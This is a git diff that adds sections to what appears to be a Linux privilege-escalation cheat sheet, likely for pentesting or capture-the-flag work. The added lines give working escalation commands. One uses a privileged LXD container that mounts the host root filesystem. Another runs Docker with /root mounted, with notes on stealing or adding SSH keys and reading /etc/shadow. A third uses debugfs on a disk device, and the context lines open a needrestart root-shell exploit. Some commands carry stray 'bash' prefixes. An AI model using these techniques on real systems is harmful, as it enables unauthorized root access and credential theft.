@@ -40,6 +40,37 @@ Using SSH
 
 ```
 
+##Privileged Groups
+LXC / LXD
+
+```
+id
+
+uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
+
+Unzip the Alpine image.
+Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step.
+
+lxd init
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+lxc init alpine r00t -c security.privileged=true
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+lxc start r00t
+~/64-bit Alpine$ lxc exec r00t /bin/sh
+```
+##Docker, Disk, ADM
+
+```
+Docker → Effectively root
+bashdocker run -v /root:/mnt -it ubuntu
+Mount any host dir → steal/add SSH keys, read /etc/shadow
+💿 Disk → Full filesystem access
+Use debugfs on /dev/sda1 → same impact as root
+📋 ADM → Read all logs in /var/log
+bashfind / -group adm -type f 2>/dev/null
+No direct root, but leaks creds, cron jobs, user activity
+```
+
 ##needrestart v3.7
 ```
 echo 'system("/bin/bash");' > /tmp/root.sh
